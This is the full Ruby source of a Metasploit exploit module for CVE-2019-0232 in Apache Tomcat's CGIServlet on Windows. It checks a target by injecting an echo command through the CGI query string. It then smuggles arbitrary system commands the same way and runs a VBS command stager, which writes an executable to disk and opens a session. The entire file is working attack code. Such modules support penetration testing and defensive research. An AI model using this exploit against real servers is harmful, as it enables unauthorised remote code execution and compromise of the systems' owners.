# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a vulnerability in Apache Tomcat&#039;s CGIServlet component. When the
        enableCmdLineArguments setting is set to true, a remote user can abuse this to execute
        system commands, and gain remote code execution.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Yakov Shafranovich&#039;, # Original discovery
          &#039;sinn3r&#039;              # Metasploit module
        ],
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;         =>
        [
          [ &#039;Apache Tomcat 9.0 or prior for Windows&#039;, { } ]
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-0232&#039;],
          [&#039;URL&#039;, &#039;https://wwws.nightwatchcybersecurity.com/2019/04/30/remote-code-execution-rce-in-cgi-servlet-apache-tomcat-on-windows-cve-2019-0232/&#039;],
          [&#039;URL&#039;, &#039;https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/&#039;]
        ],
      &#039;Notes&#039;           =>
        {
          &#039;SideEffects&#039; => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;CmdStagerFlavor&#039; => &#039;vbs&#039;,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;RPORT&#039; => 8080
        },
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Apr 10 2019&#039;, # Date of public advisory issued by the vendor
      &#039;DefaultTarget&#039;   => 0
      ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to CGI script&#039;, &#039;/&#039;])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
      ])

    deregister_options(&#039;SRVHOST&#039;, &#039;SRVPORT&#039;, &#039;URIPATH&#039;)
  end

  def check
    sig = Rex::Text.rand_text_alpha(10)
    uri = normalize_uri(target_uri.path)
    uri << "?&echo+#{sig}"

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })

    unless res
      vprint_error(&#039;No Response from server&#039;)
      return CheckCode::Unknown
    end

    if res.body.include?(sig)
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def execute_command(cmd, opts={})
    # Our command stager assumes we have access to environment variables.
    # We don&#039;t necessarily have that, so we have to modify cscript to a full path.
    cmd.gsub!(&#039;cscript&#039;, &#039;C:\\Windows\\System32\\cscript.exe&#039;)

    uri = normalize_uri(target_uri.path)
    uri << "?&#{CGI.escape(cmd)}"

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })

    unless res
      fail_with(Failure::Unreachable, &#039;No response from server&#039;)
    end

    unless res.code == 200
      fail_with(Failure::Unknown, "Unexpected server response: #{res.code}")
    end
  end

  # it seems we don&#039;t really have a way to retrieve the filenames from the VBS command stager,
  # so we need to rely on the user to cleanup the files.
  def on_new_session(cli)
    print_warning(&#039;Make sure to manually cleanup the exe generated by the exploit&#039;)
    super
  end

  def exploit
    print_status("Checking if #{rhost} is vulnerable")
    unless check == CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;)
      end

      print_warning(&#039;Target does not appear to be vulnerable.&#039;)
    end

    print_status("#{rhost} seems vulnerable, what a good day.")
    execute_cmdstager(flavor: :vbs, temp: &#039;.&#039;, linemax: 7000)
  end
end

